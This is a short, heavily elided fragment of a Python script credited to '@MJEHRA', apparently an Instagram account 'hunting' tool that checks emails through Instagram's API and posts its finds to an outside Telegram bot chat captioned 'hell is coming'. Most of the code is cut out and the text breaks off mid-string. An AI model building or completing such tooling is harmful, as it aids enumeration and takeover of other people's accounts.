...
print(EHRA)
print ("\033[1;30m                тσσℓ ιѕ ρяσgяαммє∂ ву @MJEHRA")
print ('\033[1;36m')
print("▩"*60)
print('')
######EHRA#####
...
def hunting(email):	
    ...
    'ig_sig_key_version': '4',
		...
		try:
			...
			name = None
		date = date_sc(Id)			
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/MJEHRA/6/15&caption=*• 𝙝𝙚𝙡𝙡 𝙞𝙨 𝙘𝙤𝙢𝙞𝙣𝙜 
